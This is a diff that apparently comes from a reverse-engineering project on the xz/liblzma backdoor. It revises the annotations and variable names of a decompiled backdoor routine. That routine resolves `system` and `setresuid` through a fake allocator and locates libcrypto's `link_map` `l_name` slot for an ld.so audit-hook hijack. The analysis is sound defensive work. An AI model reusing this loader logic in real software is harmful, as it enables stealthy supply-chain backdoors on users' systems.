@@ -5,13 +5,13 @@
 
 
 /*
- * AutoDoc: Locates liblzma’s live `link_map::l_name` byte and resolves the libc/libcrypto imports required for the audit-hook pivot. The helper
- * runs every lookup through the fake liblzma allocator (logging the probe via `secret_data_append_from_address`) so it can safely
- * pull in `exit`, `setlogmask`, `setresgid`, `setresuid`, `system`, `shutdown`, and `BN_num_bits`. With `_dl_audit_preinit`
- * validated inside ld.so, it walks the baked link_map snapshot until a candidate entry’s RELRO tuple matches the runtime liblzma
- * image, then measures the displacement between the snapshot and runtime pointer. That delta populates both `*libname_offset` and
- * `hooks->ldso_ctx.libcrypto_l_name`, and the helper insists that `_dl_audit_preinit` and `_dl_audit_symbind_alt` each issue an
- * LEA that applies the same delta before finalizing the import list.
+ * AutoDoc: Resolves the libc/libcrypto imports needed for the ld.so audit-hook pivot and recovers the `link_map` offsets used to patch `l_name`.
+ * It routes each lookup through the fake liblzma allocator (plus a `secret_data_append_from_address` breadcrumb) to resolve `exit`, `setlogmask`, `setresgid`,
+ * `setresuid`, `system`, `shutdown`, and libcrypto’s `BN_num_bits`. To locate `l_name` it bounds-checks `_dl_audit_preinit`, scans liblzma’s live `link_map`
+ * for the stored GNU_RELRO vaddr+size tuple, and then searches the prefix fields for a self-relative pointer that lands just past that tuple (the inferred libname
+ * buffer). The inferred buffer offset becomes `*libname_offset`, while the pointer-field’s address yields the `l_name` slot offset that is reused to populate
+ * `hooks->ldso_ctx.libcrypto_l_name`. As a sanity check it requires both `_dl_audit_preinit` and `_dl_audit_symbind_alt` to reference the same offset via LEA
+ * before accepting the result.
  */
 
 #include "xzre_types.h"
@@ -23,10 +23,10 @@ BOOL find_link_map_l_name
 {
   libc_imports_t *libc_imports;
   elf_info_t *ldso_image;
-  link_map *candidate_runtime_map;
+  link_map *candidate_name_ptr;
   dl_audit_symbind_alt_fn code_start;
   BOOL status_ok;
-  ptrdiff_t libname_snapshot_offset;
+  ptrdiff_t l_name_slot_offset;
   lzma_allocator *allocator;
   pfn_exit_t exit_fn;
   pfn_setlogmask_t setlogmask_fn;
@@ -38,11 +38,11 @@ BOOL find_link_map_l_name
   pfn_setresuid_t setresuid_fn;
   pfn_system_t system_fn;
   pfn_shutdown_t shutdown_fn;
-  link_map *best_snapshot_slot;
-  link_map *best_runtime_map;
+  link_map *best_name_ptr_slot;
+  link_map *best_name_ptr;
   u64 displacement;
   link_map *snapshot_slot;
-  link_map *runtime_upper_bound;
+  link_map *name_ptr_upper_bound;
   link_map *snapshot_cursor;
   
   // AutoDoc: Log the recon step through the secret-data channel so later telemetry can tie GOT patches back to this probe.
@@ -89,27 +89,27 @@ BOOL find_link_map_l_name
 LAB_001041f0:
         if (snapshot_cursor != snapshot_slot) {
           ldso_image = data_handle->cached_elf_handles->liblzma;
-          // AutoDoc: Skip snapshot entries whose RELRO tuple doesn’t match the running liblzma image.
+          // AutoDoc: Scan the live liblzma `link_map` until the stored GNU_RELRO vaddr+size tuple surfaces; this anchors the tail layout for the running glibc build.
           if ((*(u64 *)snapshot_cursor != ldso_image->gnurelro_vaddr) ||
              (*(u64 *)(snapshot_cursor + 8) != ldso_image->gnurelro_memsize)) goto LAB_001041ec;
-          best_snapshot_slot = (link_map *)0x0;
-          best_runtime_map = (link_map *)0xffffffffffffffff;
-          // AutoDoc: Walk the baked link_map array and pick the runtime pointer whose address range overlaps the cached struct.
+          best_name_ptr_slot = (link_map *)0x0;
+          best_name_ptr = (link_map *)0xffffffffffffffff;
+          // AutoDoc: Search the `link_map` prefix for the smallest self-relative pointer that lands just past the RELRO tuple; treat it as the libname buffer pointer.
           for (snapshot_slot = data_handle->runtime_data->liblzma_link_map; snapshot_slot < snapshot_cursor + 0x18;
               snapshot_slot = snapshot_slot + 8) {
-            candidate_runtime_map = *(link_map **)snapshot_slot;
-            if (snapshot_cursor + 0x18 <= candidate_runtime_map) {
-              runtime_upper_bound = best_runtime_map;
-              if (snapshot_cursor + 0x68 <= best_runtime_map) {
-                runtime_upper_bound = snapshot_cursor + 0x68;
+            candidate_name_ptr = *(link_map **)snapshot_slot;
+            if (snapshot_cursor + 0x18 <= candidate_name_ptr) {
+              name_ptr_upper_bound = best_name_ptr;
+              if (snapshot_cursor + 0x68 <= best_name_ptr) {
+                name_ptr_upper_bound = snapshot_cursor + 0x68;
               }
-              if (candidate_runtime_map < runtime_upper_bound) {
-                best_snapshot_slot = snapshot_slot;
-                best_runtime_map = candidate_runtime_map;
+              if (candidate_name_ptr < name_ptr_upper_bound) {
+                best_name_ptr_slot = snapshot_slot;
+                best_name_ptr = candidate_name_ptr;
               }
             }
           }
-          if (best_runtime_map != (link_map *)0xffffffffffffffff) {
+          if (best_name_ptr != (link_map *)0xffffffffffffffff) {
             allocator->opaque = data_handle->cached_elf_handles->libc;
             setresuid_fn = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
             libc_imports->setresuid = setresuid_fn;
@@ -117,17 +117,17 @@ LAB_001041f0:
               libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
             }
             snapshot_cursor = data_handle->runtime_data->liblzma_link_map;
-            // AutoDoc: Measure how far the runtime `link_map` lives from the snapshot; this becomes `*libname_offset`.
-            displacement = (long)best_runtime_map - (long)snapshot_cursor;
-            // AutoDoc: Reuse the same offset against the cached libcrypto map so both libraries’ `l_name` slots are addressed consistently.
-            libname_snapshot_offset = (int)snapshot_cursor - (int)best_snapshot_slot;
-            if (snapshot_cursor <= best_snapshot_slot) {
-              libname_snapshot_offset = (int)best_snapshot_slot - (int)snapshot_cursor;
+            // AutoDoc: Convert the inferred libname buffer pointer into an offset from the `link_map` base; this becomes `*libname_offset`.
+            displacement = (long)best_name_ptr - (long)snapshot_cursor;
+            // AutoDoc: Compute the offset of the `l_name` pointer slot so we can address it inside libcrypto’s `link_map` as well.
+            l_name_slot_offset = (int)snapshot_cursor - (int)best_name_ptr_slot;
+            if (snapshot_cursor <= best_name_ptr_slot) {
+              l_name_slot_offset = (int)best_name_ptr_slot - (int)snapshot_cursor;
             }
-            // AutoDoc: Point the libcrypto `l_name` pointer at the runtime map so later hooks can mirror the forged basename there too.
+            // AutoDoc: Cache the address of libcrypto’s `l_name` slot so stage two can swap it to the forged basename buffer and restore it later.
             (hooks->ldso_ctx).libcrypto_l_name =
-                 (char **)(data_handle->runtime_data->libcrypto_link_map + libname_snapshot_offset);
-            // AutoDoc: Require `_dl_audit_preinit` to materialise the displacement via LEA before trusting the offset.
+                 (char **)(data_handle->runtime_data->libcrypto_link_map + l_name_slot_offset);
+            // AutoDoc: Require `_dl_audit_preinit` to reference the inferred libname offset via LEA before trusting the layout.
             status_ok = find_lea_instruction(audit_sym_start,audit_sym_start + audit_preinit_symbol->st_size,displacement)
             ;
             if (status_ok == FALSE) {
@@ -135,7 +135,7 @@ LAB_001041f0:
             }
             // AutoDoc: Grab `_dl_audit_symbind_alt`’s entry point so the second LEA search runs against its relocated body.
             code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
-            // AutoDoc: Mirror the LEA search inside `_dl_audit_symbind_alt` to ensure both audit paths agree on the displacement.
+            // AutoDoc: Mirror the LEA search inside `_dl_audit_symbind_alt` to ensure both audit paths agree on the inferred libname offset.
             status_ok = find_lea_instruction
                               ((u8 *)code_start,
                                (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
